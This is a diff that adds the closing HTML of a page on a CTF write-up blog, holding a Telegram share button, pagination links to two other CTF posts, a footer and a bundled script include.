+  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+    </div>
+  </div>
+</a>
+
+      </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="/posts/2023/05/pwnme-2023-pwn/vip_at_libc/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">🇫🇷 PwnMe 2023 - pwn/vip_at_libc</span>
+                </a>
+            </span>
+            
+
+            
+            <span class="button next">
+                <a href="/posts/2023/03/picoctf-2023-web/java-code-analysis/">
+                    <span class="button__text">🇬🇧 PicoCTF 2023 - web/Java Code Analysis!?!</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2024</span>
+            <span><a href="/">conflict</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>framework: <a href="http://gohugo.io">Hugo</a></span><span>in rami malek we trust</span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>
+
+
+
+
+    </body>
+</html>
